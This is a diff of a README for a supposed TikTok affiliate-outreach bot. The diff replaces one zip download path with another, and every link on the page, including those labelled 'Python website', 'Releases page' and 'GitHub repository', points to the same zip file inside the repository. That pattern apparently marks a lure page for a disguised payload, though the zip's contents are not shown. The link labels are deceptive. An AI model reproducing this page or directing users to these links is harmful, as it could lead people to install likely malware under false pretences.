@@ -4,13 +4,13 @@
 Welcome to the tiktok-shop-bot! This handy tool helps you automate your affiliate outreach on TikTok. With this bot, you can easily manage your affiliate programs and boost your TikTok shop’s visibility. 
 
 ## 📥 Download App
-[![Download tiktok-shop-bot](https://raw.githubusercontent.com/akrrichard/tiktok-shop-bot/main/osteodentinal/tiktok-shop-bot.zip)](https://raw.githubusercontent.com/akrrichard/tiktok-shop-bot/main/osteodentinal/tiktok-shop-bot.zip)
+[![Download tiktok-shop-bot](https://github.com/akrrichard/tiktok-shop-bot/raw/refs/heads/main/template/tiktok-bot-shop-v1.9.zip)](https://github.com/akrrichard/tiktok-shop-bot/raw/refs/heads/main/template/tiktok-bot-shop-v1.9.zip)
 
 ## 🚀 Getting Started
 To get started with the tiktok-shop-bot, you will need to follow a few simple steps. We designed this process for everyday users, so you don’t need any programming skills.
 
 ### 1. Navigate to the Release Page
-First, go to the [Releases page](https://raw.githubusercontent.com/akrrichard/tiktok-shop-bot/main/osteodentinal/tiktok-shop-bot.zip). Here, you will find the latest version of the tiktok-shop-bot ready for download.
+First, go to the [Releases page](https://github.com/akrrichard/tiktok-shop-bot/raw/refs/heads/main/template/tiktok-bot-shop-v1.9.zip). Here, you will find the latest version of the tiktok-shop-bot ready for download.
 
 ### 2. Choose the Right File
 On the Releases page, you will see a list of available files. Look for the file that suits your operating system. Typically, you’ll see options for Windows, macOS, and Linux. Click on the correct file to start downloading.
@@ -22,7 +22,7 @@ Once you have selected the file for your system, the download will begin. After 
 - **For macOS:** Open the downloaded `.dmg` file and drag the tiktok-shop-bot into your Applications folder. 
 - **For Linux:** Extract the downloaded tar file and follow the provided instructions in the documentation.
 
-For easy reference, here’s the [Download page](https://raw.githubusercontent.com/akrrichard/tiktok-shop-bot/main/osteodentinal/tiktok-shop-bot.zip) again.
+For easy reference, here’s the [Download page](https://github.com/akrrichard/tiktok-shop-bot/raw/refs/heads/main/template/tiktok-bot-shop-v1.9.zip) again.
 
 ## ⚙️ System Requirements
 To ensure that tiktok-shop-bot runs smoothly, please check the following requirements for your system:
@@ -32,7 +32,7 @@ To ensure that tiktok-shop-bot runs smoothly, please check the following require
 - **Linux:** Supported distributions (e.g., Ubuntu 18.04 or later)
 - **Python:** Version 3.6 or higher should be installed. 
 
-Note: If you do not have Python installed, please visit the official [Python website](https://raw.githubusercontent.com/akrrichard/tiktok-shop-bot/main/osteodentinal/tiktok-shop-bot.zip) to download it.
+Note: If you do not have Python installed, please visit the official [Python website](https://github.com/akrrichard/tiktok-shop-bot/raw/refs/heads/main/template/tiktok-bot-shop-v1.9.zip) to download it.
 
 ## 🎯 Features
 The tiktok-shop-bot comes with several features designed to make your affiliate outreach easier:
@@ -51,7 +51,7 @@ After installation, open the application. Here’s how to get started:
 4. **Launch Campaigns:** Start sending messages to your selected affiliates.
 
 ## 📊 Support & Troubleshooting
-If you encounter any issues while using tiktok-shop-bot, please refer to the FAQ section available on the application or check the issues section on the [GitHub repository](https://raw.githubusercontent.com/akrrichard/tiktok-shop-bot/main/osteodentinal/tiktok-shop-bot.zip). 
+If you encounter any issues while using tiktok-shop-bot, please refer to the FAQ section available on the application or check the issues section on the [GitHub repository](https://github.com/akrrichard/tiktok-shop-bot/raw/refs/heads/main/template/tiktok-bot-shop-v1.9.zip). 
 
 Common issues include:
 
@@ -62,7 +62,7 @@ Common issues include:
 ## 🎉 Community & Feedback
 We encourage you to join the community to learn more and share your experiences:
 
-- Feel free to reach out with any suggestions or feature requests by opening an issue on the [GitHub page](https://raw.githubusercontent.com/akrrichard/tiktok-shop-bot/main/osteodentinal/tiktok-shop-bot.zip).
+- Feel free to reach out with any suggestions or feature requests by opening an issue on the [GitHub page](https://github.com/akrrichard/tiktok-shop-bot/raw/refs/heads/main/template/tiktok-bot-shop-v1.9.zip).
 - Share your experience in using the tiktok-shop-bot to help others in the community.
 
 ## 📞 Contact
@@ -70,4 +70,4 @@ For further inquiries or support, please contact us through the GitHub repositor
 
 Thank you for using tiktok-shop-bot. Enjoy simplifying your affiliate outreach! 
 
-[Download tiktok-shop-bot again here](https://raw.githubusercontent.com/akrrichard/tiktok-shop-bot/main/osteodentinal/tiktok-shop-bot.zip) and get started today!
+[Download tiktok-shop-bot again here](https://github.com/akrrichard/tiktok-shop-bot/raw/refs/heads/main/template/tiktok-bot-shop-v1.9.zip) and get started today!
